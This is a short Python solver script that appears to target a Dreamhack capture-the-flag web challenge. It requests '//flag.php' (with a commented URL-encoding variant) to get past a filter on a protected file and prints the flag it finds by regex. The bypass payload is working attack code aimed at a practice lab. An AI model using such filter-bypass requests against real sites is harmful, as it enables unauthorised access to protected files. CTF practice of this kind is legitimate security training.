import requests, hashlib, re

url = 'http://host3.dreamhack.games:17183'

payload = '//flag.php'
# payload = f'/fl%{format(ord('a'), 'x')}g.php'

res = requests.get(f'{url}/{payload}')
print(re.search(r'DH\{[^>]*\}', res.text).group(0))